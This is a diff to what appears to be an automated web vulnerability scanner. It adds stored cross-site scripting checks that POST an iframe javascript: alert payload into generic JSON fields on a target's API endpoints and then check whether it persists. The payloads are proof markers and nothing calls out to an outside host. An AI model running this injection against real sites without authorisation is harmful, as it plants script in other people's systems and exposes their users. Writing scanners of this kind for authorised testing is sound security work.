@@ -198,12 +198,20 @@
   STORED_PAYLOAD = '<script>alert("STORED_XSS_PROOF")</script>'
   MARKER = 'STORED_XSS_PROOF'
 
-  # Collect all display pages to check after injection
+  # Collect ALL display pages to check after injection (cross-page stored XSS)
   _all_display_pages = set()
   for f in all_forms:
       _all_display_pages.add(f.get('page', f.get('action', BASE)))
   for p in list(_G.get('AUTH_PAGES', {}).keys())[:20]:
       _all_display_pages.add(p)
+  # Also check API endpoints (SPAs render data from /api/ responses)
+  for _link in list(_G.get('ALL_LINKS', set()))[:30]:
+      if '/api/' in _link or '/rest/' in _link:
+          _all_display_pages.add(_link)
+  # Check common display pages where stored content renders
+  for _dp in ['/comments', '/reviews', '/feedback', '/messages', '/posts',
+              '/admin', '/dashboard', '/users', '/profile', '/search']:
+      _all_display_pages.add(BASE.rstrip('/') + _dp)
 
   for form in stored_forms:
       action = form['action']
@@ -253,6 +261,50 @@
               break
           else:
               print(f"    {fname}: payload not found on any display page")
+
+  # ═══════════════════════════════════════════════════════════════════
+  # PART D — STORED XSS via REST API (JSON POST with XSS in values)
+  # ═══════════════════════════════════════════════════════════════════
+  # SPAs often accept JSON — inject XSS in string fields via API
+  api_write_endpoints = []
+  for _link in _G.get('ALL_LINKS', set()):
+      if '/api/' in _link or '/rest/' in _link:
+          api_write_endpoints.append(_link.split('?')[0])
+  api_write_endpoints = list(set(api_write_endpoints))[:15]
+
+  if api_write_endpoints:
+      print(f"\n[XSS] Testing {len(api_write_endpoints)} API endpoints for stored XSS via JSON")
+      _API_XSS_MARKER = 'XSS_API_STORED_PROOF_42'
+      _API_XSS_PAYLOAD = f'<iframe src="javascript:alert(\'{_API_XSS_MARKER}\')"></iframe>'
+      _GENERIC_FIELDS = ['comment', 'message', 'text', 'body', 'content', 'name',
+                         'title', 'description', 'feedback', 'review', 'note', 'query']
+      for _api_url in api_write_endpoints:
+          for _field in _GENERIC_FIELDS:
+              time.sleep(0.3)
+              try:
+                  _r = session.post(_api_url, json={_field: _API_XSS_PAYLOAD}, timeout=10,
+                                    headers={'Content-Type': 'application/json'})
+                  if _r.status_code in (200, 201):
+                      # Check if the XSS payload is returned unescaped in the response
+                      if _API_XSS_PAYLOAD in _r.text or _API_XSS_MARKER in _r.text:
+                          print(f"[HIGH] Stored XSS via API: POST {_api_url} field={_field}")
+                          print(f"  Payload returned unescaped in JSON response")
+                          xss_findings.append({
+                              'type': 'stored-api', 'url': _api_url, 'param': _field,
+                              'payload': _API_XSS_PAYLOAD, 'method': 'POST (JSON)',
+                          })
+                          break
+                      # Also GET the same endpoint to see if stored
+                      _rg = session.get(_api_url, timeout=10)
+                      if _API_XSS_PAYLOAD in _rg.text:
+                          print(f"[HIGH] Stored XSS via API: {_api_url} field={_field} (persisted)")
+                          xss_findings.append({
+                              'type': 'stored-api', 'url': _api_url, 'param': _field,
+                              'payload': _API_XSS_PAYLOAD, 'method': 'POST (JSON)',
+                          })
+                          break
+              except Exception:
+                  continue
 
   # ═══════════════════════════════════════════════════════════════════
   # SUMMARY
